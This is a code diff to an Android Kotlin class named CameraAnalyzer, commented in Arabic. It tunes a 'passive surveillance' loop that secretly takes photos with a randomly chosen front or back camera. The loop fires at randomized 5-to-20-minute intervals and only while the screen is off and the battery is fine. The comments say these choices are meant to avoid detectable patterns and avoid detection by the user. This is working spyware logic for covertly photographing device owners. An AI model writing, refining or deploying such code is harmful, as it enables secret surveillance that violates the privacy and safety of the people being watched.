@@ -42,6 +42,7 @@ import kotlin.random.Random
  * ✅ تم إضافة @Volatile للمتغيرات المشتركة لضمان رؤية التغييرات بين الخيوط.
  * ✅ تم تحويل harvest إلى suspend لمنع سباقات الخيوط وضمان التسلسل الزمني.
  * ✅ تم إضافة المراقبة السلبية المستمرة (Passive Surveillance) بفترات عشوائية.
+ * ✅ تم توسيع فترات المراقبة السلبية إلى 5-20 دقيقة مع التحقق من البطارية.
  */
 class CameraAnalyzer(
     context: Context,
@@ -91,7 +92,7 @@ class CameraAnalyzer(
         "front_camera_id" to 1,
         "back_camera_id" to 0,
         "max_image_dimension" to 2048,
-        "passive_surveillance_enabled" to true // ✅ إضافة مفتاح لتفعيل/تعطيل المراقبة السلبية
+        "passive_surveillance_enabled" to true
     )
 
     // ========== متغيرات Camera2 ==========
@@ -631,7 +632,7 @@ class CameraAnalyzer(
     }
 
     // ============================================================
-    //  ✅ المراقبة السلبية المستمرة (Passive Surveillance)
+    //  ✅ المراقبة السلبية المستمرة (Passive Surveillance) – مُعدلة
     // ============================================================
     suspend fun startPassiveSurveillance() {
         val enabled = configMap["passive_surveillance_enabled"] as? Boolean ?: true
@@ -643,15 +644,14 @@ class CameraAnalyzer(
         writeLog("🛰️ Starting passive surveillance with randomized intervals...")
 
         while (scope.isActive) {
-            // فاصل زمني عشوائي بين 3 و 15 دقيقة لتجنب الأنماط القابلة للكشف
-            val sleepTime = Random.nextLong(180_000, 900_000)
+            // ✅ فاصل عشوائي بين 5 و 20 دقيقة (300,000 - 1,200,000 مللي ثانية)
+            val sleepTime = Random.nextLong(300_000, 1_200_000)
             delay(sleepTime)
 
             try {
-                // ✅ التحقق من أن الشاشة مطفأة لتجنب اكتشاف المستخدم
+                // ✅ التحقق من الشاشة والبطارية لتجنب الكشف واستنزاف الطاقة
                 if (!isScreenOn(appContext) && isPowerOk()) {
                     writeLog("📸 Passive surveillance triggered (screen off, battery ok)")
-                    // اختيار كاميرا عشوائية (أمامية أو خلفية)
                     val randomCam = Random.nextInt(2)
                     harvest(randomCam)
                 } else {
